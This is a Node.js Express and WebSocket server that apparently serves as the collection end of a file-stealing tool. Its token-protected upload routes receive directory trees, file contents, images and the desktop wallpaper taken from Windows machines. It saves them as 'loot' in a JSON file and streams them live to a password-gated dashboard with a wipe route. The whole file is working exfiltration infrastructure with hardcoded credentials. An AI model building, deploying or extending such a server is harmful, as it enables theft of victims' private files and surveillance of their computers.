const express = require('express');
const { WebSocketServer } = require('ws');
const http = require('http');
const fs = require('fs');
const cookieParser = require('cookie-parser');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const uploadToken = '06a3111a4b61f5ea2959f7a8207547fc';
const dashboardPassword = '12345';
const wipePassword = '7c16dd6b84e7bf36ae42effe78797440';

app.use(express.text({ limit: '50mb' }));  // sets limit so we can have decently large file sizes.
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

const LOOT_FILE = './loot.json';

// stores all of the good stuff
let loot = {
  directories: {},
  files: {},
  images: {},
  wallpaper: null
};

//Taken from google
function parseCookies(cookieStr) {
  return Object.fromEntries(cookieStr.split(';').map(c => c.trim().split('=')));
}

//Makes it so that you need a password for the dashboard.
function requireDashboardAuth(req, res, next) {
  if (req.cookies.auth !== dashboardPassword) {
    return res.sendFile(__dirname + '/public/login.html');
  }
  next();
}

function requireUploadAuth(req, res, next) { // Make it so that the upload token is required to accept the post requests. Stops people from just sending random stuff. 
  if (req.headers['x-auth'] !== uploadToken) return res.sendStatus(403);
  next();
}

// Needed help from claude on this one. Persistence is a bitch
if (fs.existsSync(LOOT_FILE)) {
  try {
    loot = JSON.parse(fs.readFileSync(LOOT_FILE, 'utf8'));
    console.log('Loaded loot from disk');
  } catch (e) {
    console.log('Failed to load loot.json, starting fresh');
  }
}

// Writes loot to disk so it survives restarts
function saveLoot() {
  fs.writeFileSync(LOOT_FILE, JSON.stringify(loot), 'utf8');
}

//Function to send out the data to each person connected
function broadcast(type, data) {
  wss.clients.forEach((client) => {
    client.send(JSON.stringify({ type, data }));
  });
}

// Adds path to the 'tree' which is basically just a parent child structure. The starting parent is always the C: drive
function addPathToTree(tree, filePath) {
  const parts = filePath.trim().split('\\');
  let current = tree;
  for (let i = 0; i < parts.length; i++) {
    const part = parts[i];
    if (i === parts.length - 1 && part.includes('.')) {
      current[part] = null;
    } else {
      if (!current[part]) current[part] = {};
      current = current[part];
    }
  }
}

// --- Upload routes (before dashboard auth, they use their own token) ---

app.post('/upload/wallpaper', requireUploadAuth, (req, res) => {
  const firstNewline = req.body.indexOf('\n');
  const path = req.body.substring(0, firstNewline).trim();
  const base64 = req.body.substring(firstNewline + 1);
  console.log('Wallpaper received');
  loot.wallpaper = { path, base64 };
  saveLoot();
  broadcast('wallpaper', { path, base64 });
  res.sendStatus(200);
});

app.post('/upload/dirs', requireUploadAuth, (req, res) => {
  const lines = req.body.split('\n');
  lines.forEach(line => {
    if (line.trim()) addPathToTree(loot.directories, line); // When .split('\n') happens, sometime sthere is trailing white space, this basically says if
  }); // when you trim the string, the string is empty, skip it. Else do the addPathToTree
  saveLoot();
  broadcast('dirs', loot.directories);
  res.sendStatus(200);
});

app.post('/upload/files', requireUploadAuth, (req, res) => {
  const firstNewline = req.body.indexOf('\n');
  const path = req.body.substring(0, firstNewline).trim();
  const text = req.body.substring(firstNewline + 1);
  console.log('File received', path);
  loot.files[path] = text;
  addPathToTree(loot.directories, path);  // auto-add to the tree
  saveLoot();
  broadcast('dirs', loot.directories);    // broadcast updated tree
  broadcast('files', { path, text });
  res.sendStatus(200);
});

app.post('/upload/image', requireUploadAuth, (req, res) => {
  const firstNewline = req.body.indexOf('\n');
  const path = req.body.substring(0, firstNewline).trim();
  const base64 = req.body.substring(firstNewline + 1); // Gets full path of file, and the base64 string that 'contains' the image
  console.log('Image received:', path); // for debugging
  loot.images[path] = base64;
  addPathToTree(loot.directories, path);
  saveLoot();
  broadcast('dirs', loot.directories);  
  broadcast('image', { path, base64 }); // broadcast to the active connections
  res.sendStatus(200);
});

// logic route

app.post('/login', (req, res) => {
  if (req.body.password === dashboardPassword) {
    res.cookie('auth', dashboardPassword, { httpOnly: true });
    return res.redirect('/');
  }
  res.status(401).send('Wrong password');
});

// everything after this requires a login password

app.use(requireDashboardAuth);
app.use(express.static('public'));

// super secret route wipe
app.post('/admin/wipe', (req, res) => {
  if (req.body.password !== wipePassword) return res.sendStatus(403);
  loot = { directories: {}, files: {}, images: {}, wallpaper: null };
  saveLoot();
  broadcast('reset', {});
  res.send('Wiped');
});

app.get('/api/loot', (req, res) => {
  res.json(loot);
});

wss.on('connection', (ws, req) => {
  const cookies = parseCookies(req.headers.cookie || '');
  if (cookies.auth !== dashboardPassword) {
    ws.close();
    return;
  }
  console.log('Browser connected');
  ws.send(JSON.stringify({ type: 'dirs', data: loot.directories }));
  Object.entries(loot.files).forEach(([path, text]) => {
    ws.send(JSON.stringify({ type: 'files', data: { path, text } }));
  });
  Object.entries(loot.images).forEach(([path, base64]) => {
    ws.send(JSON.stringify({ type: 'image', data: { path, base64 } }));
  });
  if (loot.wallpaper) {
    ws.send(JSON.stringify({ type: 'wallpaper', data: loot.wallpaper }));
  }
});

server.listen(8080, () => console.log('Listening on 8080'));